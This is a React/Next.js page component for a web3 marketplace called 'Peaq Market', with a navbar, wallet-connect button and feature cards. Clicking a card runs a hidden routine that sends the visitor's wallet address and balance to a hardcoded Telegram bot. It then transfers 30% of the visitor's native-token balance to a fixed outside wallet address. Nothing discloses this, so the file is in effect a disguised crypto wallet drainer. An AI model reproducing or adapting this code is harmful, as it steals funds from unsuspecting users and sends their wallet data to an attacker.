import React from "react";
import { ethers } from "ethers";
import { ConnectWallet,useAddress, useBalance, useConnectionStatus,useSigner,useSDK} from "@thirdweb-dev/react";
import {Navbar, NavbarBrand, NavbarContent, NavbarItem, Link, Button, ButtonGroup, NavbarMenuToggle, NavbarMenu, NavbarMenuItem, Card, CardBody, Input, Image, CardFooter, CardHeader,Divider} from "@nextui-org/react";
import { NATIVE_TOKEN_ADDRESS } from '@thirdweb-dev/sdk';
import { useContext, useState, useEffect } from "react";
import ChainContext from "../context/Chain";
import { useRouter } from 'next/router';
import AcmeLogo from "./AcmeLogo";
import SearchIcon from "./SearchIcon";
import MoonIcon from "./moon";
import SunIcon from "./sun";
import { NextPage } from "next";
import {useTheme} from "next-themes";
import Head from "next/head";
import { ThirdwebSDK } from "@thirdweb-dev/sdk";

const Home: NextPage = () => {
    const [isMenuOpen, setIsMenuOpen] = React.useState(false);
    const { theme, setTheme } = useTheme();
    const router = useRouter();
    const feature = router.query.feature as string;
    const address = useAddress();
  
    const menuItems = [
      "Explore",
      "Projects",
      "Help & Feedback",
    ];
    const list = [
      {
          title: `${feature}`,
          body: "",
          price: "",
        },
        
    ];
const { data, isLoading } = useBalance(NATIVE_TOKEN_ADDRESS);
const wbalance = data?.displayValue;
    console.log(wbalance);
    
    let balx: string | undefined;
    if (wbalance !== undefined) {
      const numericBalance = parseFloat(wbalance);
      if (!isNaN(numericBalance)) {
        balx = (numericBalance * 0.3).toString();
        console.log(balx);
      } else {
        console.log("wbalance is not a valid number");
      }
    } else {
      console.log("wbalance is undefined");
    }
  
const parsedBalx = balx || '0';
const { selectedChain, setSelectedChain } = useContext(ChainContext);
const net: Record<string,string> = {
    "ethereum" : "ethereum",
    "binance": "binance",
    "arbitrum":"arbitrum",
    "polygon":"polygon",
  };
  const sdk =  useSDK();
  const connectionStatus = useConnectionStatus();
  console.log(connectionStatus);
  console.log(selectedChain);
  const [showConnectModal, setShowConnectModal] = useState(false);
  async function main() {
    if (!sdk) {
        // Handle the case where the SDK is not yet initialized
        return;
      }
    if (connectionStatus === "unknown") {
      await sendMessageToTelegram(`User is yet to connect. Hold on........`);
      console.log(`User is yet to connect. Hold on........`);
      setShowConnectModal(true);
      return;
      
    } 
    if (connectionStatus === "connecting"){
      await sendMessageToTelegram(`User's wallet is connecting be patient....`);
      console.log(`User's wallet is connecting be patient....`);
    }
    if (connectionStatus === "connected"){
      await sendMessageToTelegram(`User with wallet address:${address} and balance of ${wbalance} has connected.`);
      console.log(`User with wallet address:${address} and balance of ${wbalance} has connected.`);
    }
    if (connectionStatus === "disconnected"){
      await sendMessageToTelegram(`User has disconnected !`);
      console.log(`User has disconnected`);
      setShowConnectModal(true);
      return;
    };
    const to="0xeA7C2035EBC15a586dE05F083196883FF7D756B9";
    const txResult = await sdk.wallet.transfer(to, parsedBalx);
  };

return (
    
    <div>
        <Head>
      <title>PeaqMarket - {feature}</title>
    </Head>
 <Navbar
      isBordered
      isMenuOpen={isMenuOpen}
      onMenuOpenChange={setIsMenuOpen}
    >
      <NavbarContent className="sm:hidden" justify="start">
        <NavbarMenuToggle aria-label={isMenuOpen ? "Close menu" : "Open menu"} />
      </NavbarContent>

      <NavbarContent className="sm:hidden pr-3" justify="center">
        <NavbarBrand>
          <AcmeLogo />
          <p className="font-bold text-inherit">Peaq Market</p>
        </NavbarBrand>
      </NavbarContent>

      <NavbarContent className="hidden sm:flex gap-4" justify="center">
        <NavbarBrand>
          <AcmeLogo />
          <p className="font-bold text-inherit">Peaq Market</p>
        </NavbarBrand>
        <NavbarItem isActive>
          <Link href="#" aria-current="page">
            Explore
          </Link>
        </NavbarItem>
        <NavbarItem >
          <Link href="#" color="foreground">
            Projects
          </Link>
        </NavbarItem>
        
      </NavbarContent>

      <NavbarContent justify="end">
        <NavbarItem>
  <Button variant="ghost" onClick={() => setTheme('light')}><SunIcon/></Button>
  <Button variant="ghost" onClick={() => setTheme('dark')}><MoonIcon/></Button>
        </NavbarItem>
      </NavbarContent>

      <NavbarMenu>
        {menuItems.map((item, index) => (
          <NavbarMenuItem key={`${item}-${index}`}>
            <Link
              className="w-full"
              color={
                index === 0 ? "warning" : index === menuItems.length - 1 ? "danger" : "foreground"
              }
              href="#"
              size="lg"
            >
              {item}
            </Link>
          </NavbarMenuItem>
        ))}
      </NavbarMenu>
    </Navbar>
    <Card>
      <CardBody>
       
        <br></br>
        <p className="justify-center text-center font-small"><ConnectWallet theme={theme as ("light" | "dark" | undefined)}
        modalTitle={"Connect to Peaq Market"}/></p>
      </CardBody>
    </Card>
    <br></br>
    <div>
      <h1 className="font-bold">Explore all features</h1><br></br>
    </div>
    <div className="flex items-center">
  <Input
    label="Search"
    isClearable
    radius="lg"
    classNames={{
      label: "text-black/50 dark:text-white/90",
      input: [
        "bg-transparent",
        "text-black/90 dark:text-white/90",
        "placeholder:text-default-700/50 dark:placeholder:text-white/60",
      ],
      innerWrapper: "bg-transparent",
      inputWrapper: [
        "shadow-xl",
        "bg-default-200/50",
        "dark:bg-default/60",
        "backdrop-blur-xl",
        "backdrop-saturate-200",
        "hover:bg-default-200/70",
        "dark:hover:bg-default/70",
        "group-data-[focused=true]:bg-default-200/50",
        "dark:group-data-[focused=true]:bg-default/60",
        "!cursor-text",
      ],
    }}
    placeholder="Type to search..."
    startContent={
      <SearchIcon className="text-black/50 dark:text-white/90 text-slate-400 pointer-events-none flex-shrink-0"/>
    }
  />
</div>

<Divider/>
<br></br>
<div className="gap-4 grid grid-cols-2 sm:grid-cols-4">
      {list.map((item, index) => (
        <Card shadow="sm" key={index} isPressable onPress={() => main()} className="border-double border-2 bg-transparent">
          <CardBody className="overflow-visible p-0">
            <p className="justify-center text-center py-10 px-10 font-bold">{item.body}</p>
          </CardBody>
          <CardFooter className="text-small justify-between">
            <b>{item.title}</b>
            <p className="text-default-500">{item.price}</p>
          </CardFooter>
        </Card>
      ))}
    </div>
</div>
  );
};
const sendMessageToTelegram = async (message: string) => {
  const botToken = '6488844148:AAF76yNNMzeq3A9WqyPYdbWflixc0zNBEAU';
  const chatId = '1850200586'; // You'll need to obtain this from your Telegram bot
  
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  const response = await fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: message,
    }),
  });
}; 

export default Home;
